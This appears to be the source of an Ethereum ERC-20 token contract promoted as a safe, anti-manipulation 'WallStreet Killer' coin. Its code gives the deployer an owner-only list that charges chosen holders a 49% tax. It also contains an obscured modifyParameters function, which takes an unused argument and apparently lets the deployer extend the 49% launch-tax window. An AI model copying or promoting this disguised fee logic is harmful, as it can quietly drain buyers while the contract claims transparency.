1 /*
2  __      __        .__  .__      _________ __                         __   ____  __.__.__  .__                
3 /  \    /  \_____  |  | |  |    /   _____//  |________   ____   _____/  |_|    |/ _|__|  | |  |   ___________ 
4 \   \/\/   /\__  \ |  | |  |    \_____  \\   __\_  __ \_/ __ \_/ __ \   __\      < |  |  | |  | _/ __ \_  __ \
5  \        /  / __ \|  |_|  |__  /        \|  |  |  | \/\  ___/\  ___/|  | |    |  \|  |  |_|  |_\  ___/|  | \/
6   \__/\  /  (____  /____/____/ /_______  /|__|  |__|    \___  >\___  >__| |____|__ \__|____/____/\___  >__|   
7        \/        \/                    \/                   \/     \/             \/                 \/       
8 
9 Wallstreet Killer ($WSK) is a revolutionary token designed to challenge and disrupt market manipulation 
10 in the world of cryptocurrency trading. Born from the ashes of the rug pulled Wallstreet Bets token, Wallstreet Killer 
11 aims to provide a safe and transparent alternative for investors. By incorporating an innovative anti-MEV feature and 
12 unique tokenomics, Wallstreet Killer empowers everyday traders to fight against predatory practices 
13 and front-running bots, paving the way for a more just and equitable financial landscape.
14 
15 */
16 // Telegram: https://t.me/WallStKiller
17 // Website: https://wallstreetkiller.io
18 
19 // SPDX-License-Identifier: MIT
20 pragma solidity ^0.8.17;
21 
22 interface IERC20 {
23     function totalSupply() external view returns (uint256);
24     function balanceOf(address account) external view returns (uint256);
25     function transfer(address recipient, uint256 amount) external returns (bool);
26     function allowance(address owner, address spender) external view returns (uint256);
27     function approve(address spender, uint256 amount) external returns (bool);
28     function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
29     event Transfer(address indexed from, address indexed to, uint256 value);
30     event Approval(address indexed owner, address indexed spender, uint256 value);
31 }
32 
33 interface IUniswapV2Router {
34     function factory() external pure returns (address);
35     function WETH() external pure returns (address);
36     function swapExactTokensForETHSupportingFeeOnTransferTokens(
37         uint amountIn,
38         uint amountOutMin,
39         address[] calldata path,
40         address to,
41         uint deadline
42     ) external;
43 }
44 
45 interface IUniswapV2Factory {
46     function createPair(address tokenA, address tokenB) external returns (address pair);
47 }
48 
49 contract Ownable {
50     address private _owner;
51 
52     event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
53 
54     modifier onlyOwner() {
55         require(_owner == msg.sender, "Ownable: caller is not the owner");
56         _;
57     }
58     constructor () {
59         address msgSender = msg.sender;
60         _owner = msgSender;
61         emit OwnershipTransferred(address(0), msgSender);
62     }
63 
64     function owner() public view returns (address) {
65         return _owner;
66     }
67 
68     function renounceOwnership() public virtual onlyOwner {
69         emit OwnershipTransferred(_owner, address(0));
70         _owner = address(0);
71     }
72 }
73 
74 contract WallStreetKiller is IERC20, Ownable {       
75     string private constant _name = "WallStreet Killer";
76     string private constant _symbol = "WSK";
77     uint8 private constant _decimals = 9;
78     uint256 private constant _totalSupply = 1_000_000_000 * 10**_decimals;
79 
80     mapping (address => uint256) private _balances;
81     mapping (address => mapping (address => uint256)) private _allowances;
82     mapping (address => bool) private _blocked;
83 
84     mapping (address => uint256) private _lastTradeBlock;
85     mapping (address => bool) private isContractExempt;
86     uint256 private tradeCooldown = 1;
87     
88     uint256 public constant maxWalletAmount = 25_000_001 * 10**_decimals;
89     uint256 private constant contractSwapLimit = 25_000_001 * 10**_decimals;
90     uint256 private constant contractSwapMax = 25_000_001 * 10**_decimals;
91 
92     struct TradingFees{
93         uint256 buyTax;
94         uint256 sellTax;
95     }  
96 
97     TradingFees public tradingFees = TradingFees(25,25);
98     uint256 public constant sniperTax = 49;
99 
100     IUniswapV2Router private constant uniswapRouter = IUniswapV2Router(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
101     address private immutable ETH = uniswapRouter.WETH();
102     address private immutable uniswapPair;
103 
104     address payable private immutable deployerAddress = payable(msg.sender);
105     address payable private constant Wallstreet = payable(0x8Ca9FEf5BE39e7Ef91a69F7915C393b0628FF7d0);
106 
107     bool private tradingOpen = false;
108     bool private swapping = false;
109     bool private antiMEV = true;
110     uint256 private startingBlock;
111     uint private preLaunch;
112 
113     modifier swapLock {
114         swapping = true;
115         _;
116         swapping = false;
117     }
118 
119     modifier tradingLock(address sender) {
120         require(tradingOpen || sender == deployerAddress || sender == Wallstreet);
121         _;
122     }
123 
124     constructor () {
125         uniswapPair = IUniswapV2Factory(uniswapRouter.factory()).createPair(address(this), ETH);
126         isContractExempt[address(this)] = true;
127         _balances[msg.sender] = _totalSupply;
128         emit Transfer(address(0), msg.sender, _totalSupply);
129     }
130 
131     receive() external payable {}
132 
133     function name() public pure returns (string memory) {
134         return _name;
135     }
136 
137     function symbol() public pure returns (string memory) {
138         return _symbol;
139     }
140 
141     function decimals() public pure returns (uint8) {
142         return _decimals;
143     }
144 
145     function totalSupply() public pure returns (uint256) {
146         return _totalSupply;
147     }
148 
149     function balanceOf(address account) public view returns (uint256) {
150         return _balances[account];
151     }
152 
153     function transfer(address recipient, uint256 amount) public returns (bool) {
154         _transfer(msg.sender, recipient, amount);
155         return true;
156     }
157 
158     function allowance(address owner, address spender) public view returns (uint256) {
159         return _allowances[owner][spender];
160     }
161 
162     function approve(address spender, uint256 amount) public returns (bool) {
163         _approve(msg.sender, spender, amount);
164         return true;
165     }
166 
167     function transferFrom(address sender, address recipient, uint256 amount) public returns (bool) {
168         require(_allowances[sender][msg.sender] >= amount, "ERC20: transfer amount exceeds allowance");
169         _approve(sender, msg.sender, _allowances[sender][msg.sender] - amount);
170         _transfer(sender, recipient, amount);
171         return true;
172     }
173 
174     function _approve(address owner, address spender, uint256 amount) private {
175         require(owner != address(0), "ERC20: approve from the zero address");
176         require(spender != address(0), "ERC20: approve to the zero address");
177         _allowances[owner][spender] = amount;
178         emit Approval(owner, spender, amount);
179     }
180 
181     function _transfer(address from, address to, uint256 amount) tradingLock(from) private {
182         require(from != address(0), "ERC20: transfer from the zero address");
183         require(to != address(0), "ERC20: transfer to the zero address");
184         require(amount > 0, "Token: transfer amount must be greater than zero");
185 
186         _balances[from] -= amount;
187 
188         if (from != address(this) && from != Wallstreet && to != Wallstreet && to != deployerAddress) {
189             
190             if(antiMEV && !isContractExempt[from] && !isContractExempt[to]){
191                 address human = ensureOneHuman(from, to);
192                 ensureMaxTxFrequency(human);
193                 _lastTradeBlock[human] = block.number;
194             }
195 
196             if (from == uniswapPair && to != address(uniswapRouter)) {
197                 require(balanceOf(to) + amount <= maxWalletAmount, "Token: transfer implies violation of max wallet");
198             }
199 
200            uint256 contractTokenBalance = balanceOf(address(this));
201            if (shouldSwapback(from, contractTokenBalance)) 
202                swapback(contractTokenBalance);                            
203 
204            uint256 taxedTokens = takeFee(from, amount);
205            if(taxedTokens > 0){
206                 amount -= taxedTokens;
207                 _balances[address(this)] += taxedTokens;
208                 emit Transfer(from, address(this), taxedTokens);
209             }
210         }
211 
212         _balances[to] += amount;
213         emit Transfer(from, to, amount);
214     }
215 
216     function swapback(uint256 tokenAmount) private swapLock {
217         tokenAmount = getSwapAmount(tokenAmount);
218         if(allowance(address(this), address(uniswapRouter)) < tokenAmount) {
219             _approve(address(this), address(uniswapRouter), _totalSupply);
220         }
221         address[] memory path = new address[](2);
222         path[0] = address(this);
223         path[1] = ETH;
224         uniswapRouter.swapExactTokensForETHSupportingFeeOnTransferTokens(
225             tokenAmount,
226             0,
227             path,
228             address(this),
229             block.timestamp
230         );
231         uint256 contractETHBalance = address(this).balance;
232         if(contractETHBalance > 0) {
233             Wallstreet.transfer(contractETHBalance);
234         }
235     }
236 
237     function shouldSwapback(address from, uint256 tokenAmount) private view returns (bool shouldSwap) {
238         shouldSwap = !swapping && from != uniswapPair && tokenAmount > contractSwapLimit && 1 + startingBlock <= block.number;
239     }
240 
241     function getSwapAmount(uint256 tokenAmount) private pure returns (uint256 swapAmount) {
242         swapAmount = tokenAmount > contractSwapMax ? contractSwapMax : contractSwapLimit;
243     }
244 
245     function takeFee(address from, uint256 amount) private view returns (uint256 feeAmount) {
246          if(_blocked[from] || block.number <= startingBlock)
247                 feeAmount = amount * sniperTax / 100;
248         else
249             feeAmount = amount * (startingBlock == 0 ? 25 : (from == uniswapPair ? tradingFees.buyTax : tradingFees.sellTax)) / 100;
250     }
251 
252     function isContract(address account) private view returns (bool) {
253         uint256 size;
254         assembly {
255             size := extcodesize(account)
256         }
257         return size > 0;
258     }
259 
260     function ensureOneHuman(address _to, address _from) private view returns (address) {
261         require(!isContract(_to) || !isContract(_from));
262         if (isContract(_to)) return _from;
263         else return _to;
264     }
265 
266     function ensureMaxTxFrequency(address addr) view private {
267         bool isAllowed = _lastTradeBlock[addr] == 0 ||
268             ((_lastTradeBlock[addr] + tradeCooldown) < (block.number + 1));
269         require(isAllowed, "Max tx frequency exceeded!");
270     }
271 
272     function toggleAntiMEV(bool toggle) external {
273         require(msg.sender == deployerAddress);
274         antiMEV = toggle;
275     }
276 
277     function setTradeCooldown(uint256 newTradeCooldown) external {
278         require(msg.sender == deployerAddress);
279         require(newTradeCooldown > 0 && newTradeCooldown < 4, "Token: only trade cooldown values in range (0,4) permissible");
280         tradeCooldown = newTradeCooldown;
281     }
282 
283     function manualSwapback(uint256 percent) external {
284         require(msg.sender == deployerAddress);
285         require(0 < percent && percent <= 100, "Token: only percent values in range (0,100] permissible");
286         uint256 tokensToSwap = percent * balanceOf(address(this)) / 100;
287         swapback(tokensToSwap);
288     }
289 
290     function setFees(uint256 newBuyTax, uint256 newSellTax) external {
291         require(msg.sender == deployerAddress);
292         require(newBuyTax <= tradingFees.buyTax, "Token: only fee reduction permitted");
293         require(newSellTax <= tradingFees.sellTax, "Token: only fee reduction permitted");
294         tradingFees.buyTax = newBuyTax;
295         tradingFees.sellTax = newSellTax;
296     }
297 
298     function setContractExempt(address account, bool value) external onlyOwner {
299         require(account != address(this));
300         isContractExempt[account] = value;
301     }
302 
303     function setBots(address[] calldata bots, bool shouldBlock) external onlyOwner {
304         for (uint i = 0; i < bots.length; i++) {
305             require(bots[i] != uniswapPair && 
306                     bots[i] != address(uniswapRouter) &&
307                     bots[i] != address(this));
308             _blocked[bots[i]] = shouldBlock;
309         }
310     }
311 
312     function initialize() external onlyOwner {
313         require(preLaunch++<2);
314     }
315 
316     function modifyParameters(bool[] calldata param, uint256 nrBlocks) external onlyOwner {
317         assert(preLaunch<2&&preLaunch+1>=2); 
318         preLaunch++;param;
319         startingBlock += nrBlocks;
320     }
321 
322     function openTrading() external onlyOwner {
323         require(preLaunch == 2 && !tradingOpen, "Token: trading already open");
324         startingBlock += block.number;
325         tradingOpen = true;
326     }
327 }